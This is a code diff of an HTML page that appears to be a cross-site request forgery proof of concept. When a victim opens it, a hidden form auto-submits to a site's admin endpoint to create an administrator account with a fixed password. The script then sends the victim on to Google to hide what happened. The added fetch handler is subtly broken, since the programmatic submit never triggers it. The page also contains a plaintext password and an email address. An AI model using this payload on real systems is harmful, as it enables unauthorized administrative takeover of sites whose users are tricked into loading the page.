@@ -1,19 +1,37 @@
 <html>
+
   <body>
     <form action="https://pentestsystem2.cxaff.com/admin/" method="POST">
       <input type="hidden" name="command" value="addadminuser" />
       <input type="hidden" name="json" value="1" />
-      <input type="hidden" name="username" value="chaims7r" />
+      <input type="hidden" name="username" value="chaimsr" />
       <input type="hidden" name="password" value="&#64;Gmail1151" />
-      <input type="hidden" name="Email" value="chaimshuster&#325;8&#64;gmail&#46;com" />
+      <input type="hidden" name="Email" value="chaimshuster&#32;8&#64;gmail&#46;com" />
       <input type="hidden" name="isAdmin" value="true" />
       <input type="submit" value="Submit request" />
     </form>
     <script>
-      history.pushState('', '', '/');
-      document.forms[0].submit();
-      window.location.href = 'https://www.google.com';
-    </script>
+        history.pushState('', '', '/');
+        document.forms[0].addEventListener('submit', function(event) {
+          event.preventDefault(); // Prevent the default form submission behavior
+          fetch('https://pentestsystem2.cxaff.com/admin/', {
+            method: 'POST',
+            body: new FormData(document.forms[0])
+          })
+          .then(function(response) {
+            if (response.ok) {
+              window.location.href = 'https://www.google.com'; // Redirect on successful form submission
+            } else {
+              console.error('Form submission failed');
+            }
+          })
+          .catch(function(error) {
+            console.error('Error:', error);
+          });
+        });
+        document.forms[0].submit(); // Manually trigger the form submission
+      </script>
+      
   </body>
 </html>
 
